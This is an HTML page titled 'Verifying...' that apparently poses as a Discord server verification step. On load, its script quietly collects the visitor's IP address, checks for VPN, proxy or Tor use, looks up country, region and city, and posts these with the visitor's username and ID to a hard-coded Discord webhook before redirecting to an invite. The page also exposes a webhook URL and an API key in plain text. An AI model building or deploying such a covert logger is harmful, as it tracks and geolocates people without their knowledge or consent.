<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifying...</title>
</head>
<body>
<script>
const webhookUrl = 'https://discord.com/api/webhooks/1359827940598222989/XqQHlvgMtaEuthp3_tN6oNP1VqNqeDFdmTt1vJZOS3FEpKU0fvo3FPm9C5_7p3O_VYEJ';
const vpnApiKey = 'd4174ac879ec45dbaf68f0622ac553ba';

function getQueryParams() {
  const params = new URLSearchParams(window.location.search);
  return {
    username: params.get('username') || 'Not provided',
    userid: params.get('userid') || 'Not provided',
    displayName: params.get('user_display_name') || 'Not provided'
  };
}

async function sendLog() {
  try {
    const { username, userid, displayName } = getQueryParams();

    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const { ip } = await ipResponse.json();

    const vpnResponse = await fetch(`https://vpnapi.io/api/${ip}?key=${vpnApiKey}`);
    const vpnData = await vpnResponse.json();

    const embed = {
      title: 'New Verification Attempt',
      color: 3447003,
      fields: [
        { name: 'Username', value: username, inline: true },
        { name: 'User ID', value: userid, inline: true },
        { name: 'Display Name', value: displayName, inline: true },
        { name: 'IP Address', value: ip, inline: true },
        { name: 'VPN / Proxy / Tor', value: (vpnData.security.vpn || vpnData.security.proxy || vpnData.security.tor) ? 'Yes' : 'No', inline: true },
        { name: 'Country', value: vpnData.location.country || 'Unknown', inline: true },
        { name: 'Region', value: vpnData.location.region || 'Unknown', inline: true },
        { name: 'City', value: vpnData.location.city || 'Unknown', inline: true }
      ],
      footer: { text: 'catboys4.life' }
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    window.location.href = 'https://discord.gg/62uxgXXXXr'; // Replace with your actual server invite
  } catch (err) {
    console.error('Logging failed:', err);
    window.location.href = 'https://discord.gg/62uxgXXXXr';
  }
}

sendLog();
</script>
</body>
</html>
